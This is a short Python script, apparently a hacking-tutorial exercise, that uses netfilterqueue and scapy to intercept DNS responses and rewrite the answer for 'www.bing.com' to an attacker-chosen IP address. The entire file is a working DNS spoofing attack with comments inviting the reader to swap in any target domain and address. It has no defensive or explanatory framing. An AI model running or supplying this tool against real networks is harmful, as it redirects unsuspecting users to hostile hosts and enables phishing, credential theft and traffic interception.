#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# Function to process each packet in the queue
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convert the packet payload to a Scapy packet

    if scapy_packet.haslayer(scapy.DNSRR):  # Check if the packet contains a DNS response
        qname = scapy_packet[scapy.DNSQR].qname  # Extract the DNS query name

        # Check if the DNS query is for "www.bing.com" (you can change this to your target domain)
        if "www.bing.com" in qname:
            print("[+] Spoofing target")

            # Create a DNS response with a spoofed IP address (change "your_target_machine" to the desired IP)
            answer = scapy.DNSRR(rrname=qname, rdata="your_target_machine")

            # Modify the DNS response fields
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Remove the length and checksum fields to let Scapy recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set the packet payload to the modified Scapy packet
            packet.set_payload(str(scapy_packet))

    packet.accept()  # Accept the modified packet to allow it to continue its journey

# Create a NetfilterQueue object and bind it to queue 0, then run the queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
